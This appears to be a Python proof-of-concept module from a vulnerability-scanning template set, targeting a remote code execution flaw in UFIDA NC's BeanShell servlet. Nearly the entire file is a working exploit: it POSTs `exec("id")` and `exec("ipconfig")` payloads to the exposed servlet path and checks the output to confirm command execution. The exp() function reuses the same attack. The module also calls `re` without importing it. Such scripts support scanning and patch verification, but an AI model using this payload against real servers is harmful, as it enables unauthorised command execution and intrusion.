import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''UFIDA NC BeanShell Remote Code Execution''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A", 
            "https://www.cnvd.org.cn/webinfo/show/6491"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["beanshell", "rce", "cnvd", "cnvd2021"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/servlet/~ic/bsh.servlet.BshServlet"""
        method = "POST"
        data = """bsh.script=exec("id");"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/servlet/~ic/bsh.servlet.BshServlet"""
        method = "POST"
        data = """bsh.script=exec("ipconfig");"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""uid=""",resp1.text) or re.search(r"""Windows IP""",resp1.text)) and ("""BeanShell Test Servlet""" in resp1.text) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url